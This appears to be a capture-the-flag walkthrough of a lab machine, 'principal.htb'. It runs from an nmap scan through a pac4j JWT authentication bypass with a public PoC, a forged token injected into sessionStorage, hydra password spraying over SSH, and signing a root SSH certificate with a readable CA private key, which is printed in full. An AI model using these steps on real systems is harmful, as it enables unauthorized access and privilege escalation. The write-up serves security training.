
### Nmap
```
nmap -sV -sC -vv 10.129.244.220


---OUTPUT---
Nmap scan report for 10.129.244.220
Host is up, received echo-reply ttl 63 (0.019s latency).
Scanned at 2026-06-12 08:45:03 EDT for 21s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI/L7q6P/YK0AiDgynK4UBmJ6IyqoO/QPlkGcV6tb5RgFeIHduOPIUKgMKBVUO36anm3aPmZMR4iZoUACUDwi6s=
|   256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK1uLjeHDa2qBOikNycBjD8HqITM6Hj1Oj5B6cvndDMB
8080/tcp open  http-proxy syn-ack ttl 63 Jetty
|_http-server-header: Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Fri, 12 Jun 2026 12:45:11 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-06-12T12:45:11.135+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Fri, 12 Jun 2026 12:45:10 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 12 Jun 2026 12:45:10 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Fri, 12 Jun 2026 12:45:10 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Fri, 12 Jun 2026 12:45:11 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.99%I=7%D=6/12%Time=6A2BFF56%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A4,"HTTP/1\.1\x20302\x20Found\r\nDate:\x20Fri,\x2012\x20Jun\x2
SF:02026\x2012:45:10\x20GMT\r\nServer:\x20Jetty\r\nX-Powered-By:\x20pac4j-
SF:jwt/6\.0\.3\r\nContent-Language:\x20en\r\nLocation:\x20/login\r\nConten
SF:t-Length:\x200\r\n\r\n")%r(HTTPOptions,A2,"HTTP/1\.1\x20200\x20OK\r\nDa
SF:te:\x20Fri,\x2012\x20Jun\x202026\x2012:45:10\x20GMT\r\nServer:\x20Jetty
SF:\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nAllow:\x20GET,HEAD,OPTIONS\r\
SF:nAccept-Patch:\x20\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,220,
SF:"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:\x20Fr
SF:i,\x2012\x20Jun\x202026\x2012:45:10\x20GMT\r\nCache-Control:\x20must-re
SF:validate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-88
SF:59-1\r\nContent-Length:\x20349\r\n\r\n<html>\n<head>\n<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<tit
SF:le>Error\x20505\x20Unknown\x20Version</title>\n</head>\n<body>\n<h2>HTT
SF:P\x20ERROR\x20505\x20Unknown\x20Version</h2>\n<table>\n<tr><th>URI:</th
SF:><td>/badMessage</td></tr>\n<tr><th>STATUS:</th><td>505</td></tr>\n<tr>
SF:<th>MESSAGE:</th><td>Unknown\x20Version</td></tr>\n</table>\n\n</body>\
SF:n</html>\n")%r(FourOhFourRequest,13B,"HTTP/1\.1\x20404\x20Not\x20Found\
SF:r\nDate:\x20Fri,\x2012\x20Jun\x202026\x2012:45:11\x20GMT\r\nServer:\x20
SF:Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nCache-Control:\x20must-r
SF:evalidate,no-cache,no-store\r\nContent-Type:\x20application/json\r\n\r\
SF:n{\"timestamp\":\"2026-06-12T12:45:11\.135\+00:00\",\"status\":404,\"er
SF:ror\":\"Not\x20Found\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak
SF:\"}")%r(Socks5,232,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Fri,
SF:\x2012\x20Jun\x202026\x2012:45:11\x20GMT\r\nCache-Control:\x20must-reva
SF:lidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x20382\r\n\r\n<html>\n<head>\n<meta\x20http-equiv
SF:=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<title
SF:>Error\x20400\x20Illegal\x20character\x20CNTL=0x5</title>\n</head>\n<bo
SF:dy>\n<h2>HTTP\x20ERROR\x20400\x20Illegal\x20character\x20CNTL=0x5</h2>\
SF:n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr>\n<tr><th>STATUS:</
SF:th><td>400</td></tr>\n<tr><th>MESSAGE:</th><td>Illegal\x20character\x20
SF:CNTL=0x5</td></tr>\n</table>\n\n</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 8080
![[Pasted image 20260612084853.png]]

- Checking view source the main app being loaded is via `/static/js/app.js`
- Here we can see under Token management that the token is saved as `auth_token`. 
- `pav4j` is running and also looking at nmap its version 6.0.3. Looking online I see theres an authentication jwt token bypass: https://github.com/advisories/GHSA-pm7g-w2cf-q238
- I find a PoC: https://github.com/alihussainzada/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc
- Using it I get the unsigned JWT (the bypass is there is no check for unsigned and just gvalidates it)
  
```
python3 poc.py --jwks http://principal.htb:8080/api/auth/jwks --user admin \ 
--role ROLE_ADMIN
[*] Fetching JWKS...
[+] Public key loaded
[+] PlainJWT created


---OUTPUT---
=== Malicious JWE Token ===

eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.gpezDy9Nv10TVFdIfQuUHsYhrECbTpwNF9i6ockz3-IEbfwuvFyuFNlqj7MnEKJ9QvwG96XJrHA_2i9ajhQBTBvzV6wdHCbncQS5BZ-6B5HHMkYgV03hxJm8jxIzQhMyQaMgRry0dxvvDC1yM6oLlRaDfySkujRYBTtaTmV6xO6jQpWSX-usI0TWrMWT8mBB1dW_Ixg7mhsZhWK3a9uZ7wWpD49bzFoef17blQsdCMoVBKDR2_8t7rIMrm32fSBpjbV9Tj7h3Ra4B6N1ddidkLEsnaxC3tyqtoxHoo4invv2RRYmAGLFB2e7kSBSwsRzruIJif6eeJBvBngNXbxNxw.ZbnwEQ_WPX_oceXJ.PsfXodLoUMPgH06Gbr2XdKWDyrLweikNxPWfPqZL4SIdZUmqS0XYgFERxWH6GaYsTvXvHT7gWcPjiGAUgDDr5V-RQQ1SKD9kabFiJ40XAH1em7zAGk5srSaJLEsE_rBhQTL4n5nnoXNqR_xyfHINL-gWiAlAlXuNa1Q7mV23GGUrDjbT_XmjzNzTBY4cLYpi5pHREM074thAirECXC_QwAL7lrQpN5tA3suQc4GPsUBrVFCzzQ.8qYobxnAk_Waqyy-_8KKzw

Use it as:
Authorization: Bearer eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.gpezDy9Nv10TVFdIfQuUHsYhrECbTpwNF9i6ockz3-IEbfwuvFyuFNlqj7MnEKJ9QvwG96XJrHA_2i9ajhQBTBvzV6wdHCbncQS5BZ-6B5HHMkYgV03hxJm8jxIzQhMyQaMgRry0dxvvDC1yM6oLlRaDfySkujRYBTtaTmV6xO6jQpWSX-usI0TWrMWT8mBB1dW_Ixg7mhsZhWK3a9uZ7wWpD49bzFoef17blQsdCMoVBKDR2_8t7rIMrm32fSBpjbV9Tj7h3Ra4B6N1ddidkLEsnaxC3tyqtoxHoo4invv2RRYmAGLFB2e7kSBSwsRzruIJif6eeJBvBngNXbxNxw.ZbnwEQ_WPX_oceXJ.PsfXodLoUMPgH06Gbr2XdKWDyrLweikNxPWfPqZL4SIdZUmqS0XYgFERxWH6GaYsTvXvHT7gWcPjiGAUgDDr5V-RQQ1SKD9kabFiJ40XAH1em7zAGk5srSaJLEsE_rBhQTL4n5nnoXNqR_xyfHINL-gWiAlAlXuNa1Q7mV23GGUrDjbT_XmjzNzTBY4cLYpi5pHREM074thAirECXC_QwAL7lrQpN5tA3suQc4GPsUBrVFCzzQ.8qYobxnAk_Waqyy-_8KKzw

```

- We inject this into the browser console :
```
sessionStorage.setItem('auth_token', 'eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.gpezDy9Nv10TVFdIfQuUHsYhrECbTpwNF9i6ockz3-IEbfwuvFyuFNlqj7MnEKJ9QvwG96XJrHA_2i9ajhQBTBvzV6wdHCbncQS5BZ-6B5HHMkYgV03hxJm8jxIzQhMyQaMgRry0dxvvDC1yM6oLlRaDfySkujRYBTtaTmV6xO6jQpWSX-usI0TWrMWT8mBB1dW_Ixg7mhsZhWK3a9uZ7wWpD49bzFoef17blQsdCMoVBKDR2_8t7rIMrm32fSBpjbV9Tj7h3Ra4B6N1ddidkLEsnaxC3tyqtoxHoo4invv2RRYmAGLFB2e7kSBSwsRzruIJif6eeJBvBngNXbxNxw.ZbnwEQ_WPX_oceXJ.PsfXodLoUMPgH06Gbr2XdKWDyrLweikNxPWfPqZL4SIdZUmqS0XYgFERxWH6GaYsTvXvHT7gWcPjiGAUgDDr5V-RQQ1SKD9kabFiJ40XAH1em7zAGk5srSaJLEsE_rBhQTL4n5nnoXNqR_xyfHINL-gWiAlAlXuNa1Q7mV23GGUrDjbT_XmjzNzTBY4cLYpi5pHREM074thAirECXC_QwAL7lrQpN5tA3suQc4GPsUBrVFCzzQ.8qYobxnAk_Waqyy-_8KKzw')
```

- ON a refresh we can access the dahboard:
![[Pasted image 20260612104506.png]]

- Under settings i see a key : `D3pl0y_$$H_Now42!`
![[Pasted image 20260612104733.png]]
- I also see a list of users:
```
admin
svc-deploy
jthompson
amorales
bwright
kkumar
mwilson
lzhang
```

- I create a users file and spray the password and get a hit for `svc_deploy`:
```
hydra -L users -p 'D3pl0y_$$H_Now42!' ssh://principal.htb -t 60

---OUTPUT---
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-12 10:50:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://principal.htb:22/
[22][ssh] host: principal.htb   login: svc-deploy   password: D3pl0y_$$H_Now42!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-12 10:50:36
```
![[Pasted image 20260612105249.png]]

- I ssh into target:
```
ssh dvc-deploy@principal.htb
> D3pl0y_$$H_Now42!
```
![[Pasted image 20260612105439.png]]

- I grab user flag:
![[Pasted image 20260612105456.png]]

- CHecking id we see it is part of deployers group:
```
id


---OUTPUT---
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

- I see I can read a certificate in `/opt/principal/ssh` being part of `deployers` group
```
cat ca
-----BEGIN OPENSSH PRIVATE KEY-----
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
```

![[Pasted image 20260612110422.png]]

- Reading the README.txt:
```
cat README.txt 
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
```

- Now we have the private key, we can sign any certificate we want.
- We generate an ssh key, sign it with principal root:
```
ssh-keygen -t rsa -f /tmp/mykey -N ""

ssh-keygen -s /opt/principal/ssh/ca -I "deploy" -n root -V +1h /tmp/mykey.pub

```


- Finally we can ssh into it as root:
```
ssh -i /tmp/mykey -o CertificateFile=/tmp/mykey-cert.pub root@localhost
```

![[Pasted image 20260612111012.png]]

- I grab the root flag:
![[Pasted image 20260612111039.png]]